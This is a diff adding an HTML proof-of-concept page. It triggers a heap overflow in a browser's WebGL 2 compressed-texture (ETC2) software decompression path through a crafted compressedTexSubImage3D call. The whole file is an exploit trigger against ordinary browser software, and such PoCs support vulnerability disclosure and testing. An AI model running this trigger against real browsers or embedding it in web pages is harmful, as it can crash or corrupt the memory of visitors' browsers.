@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>WebGL 2 Heap Overflow PoC</title>
+</head>
+<body>
+<canvas id="c"></canvas>
+<script>
+function start() {
+  var canvas = document.getElementById("c");
+  var gl = canvas.getContext("webgl2");
+  if (!gl) {
+    console.log("WebGL 2 not supported");
+    return;
+  }
+
+  var ext = gl.getExtension("WEBGL_compressed_texture_etc");
+  if (!ext) {
+    // Try other compressed formats if ETC is not available,
+    // but ETC2 is mandatory in GLES 3.0 so commonly available or emulated.
+    // If emulated on desktop, this hits the vulnerable code path.
+    console.log("WEBGL_compressed_texture_etc not supported");
+  }
+
+  // COMPRESSED_RGBA8_ETC2_EAC = 0x9278
+  var format = 0x9278;
+
+  var width = 4;
+  var height = 4;
+  var depth = 2;
+
+  // Create a texture
+  var tex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D_ARRAY, tex);
+
+  // Allocate storage
+  // texStorage3D(target, levels, internalformat, width, height, depth)
+  gl.texStorage3D(gl.TEXTURE_2D_ARRAY, 1, format, width, height, depth);
+
+  // Create data for 2 layers.
+  // ETC2 blocks are 4x4 pixels = 8 bytes (for RGB) or 16 bytes (RGBA).
+  // 4x4 image = 1 block.
+  // We have 2 layers, so 2 blocks.
+  // Each block is 16 bytes (128 bits) for RGBA8 ETC2.
+  var blockSize = 16;
+  var dataSize = blockSize * depth;
+  var data = new Uint8Array(dataSize);
+
+  // Fill with junk
+  for (var i = 0; i < dataSize; i++) {
+    data[i] = 0xAA;
+  }
+
+  console.log("Uploading compressed texture data with depth=" + depth);
+
+  // Trigger the vulnerability:
+  // compressedTexSubImage3D(target, level, xoffset, yoffset, zoffset, width, height, depth, format, data)
+  // This calls into the vulnerable DecompressTextureData if software fallback is used.
+  gl.compressedTexSubImage3D(gl.TEXTURE_2D_ARRAY, 0, 0, 0, 0, width, height, depth, format, data);
+
+  console.log("Done.");
+}
+
+start();
+</script>
+</body>
+</html>
